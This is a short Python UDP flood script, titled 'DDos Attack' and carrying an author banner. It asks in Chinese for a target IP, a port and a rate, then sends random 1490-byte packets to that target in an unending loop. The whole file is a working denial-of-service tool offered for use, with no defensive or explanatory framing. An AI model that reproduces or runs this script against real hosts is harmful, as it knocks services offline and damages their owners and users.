# -*- coding:UTF-8 -*-
#python 3
import sys
import os
import time
import socket
import random
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   Author        : lhyxyz                          |")
print ("|   Gitee         : https://gitee.com/lhyxyz.       |")
print ("|   QQ            : 548343523                       |")
print ("\---------------------------------------------------/")
print (" ")
ip = input("攻击目标IP: ")
port = int(input("攻击端口: "))
sd = int(input("攻击频率(1~1000): "))

os.system("clear")
print("攻击正在启动...")
time.sleep(5)
os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s packets to %s port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
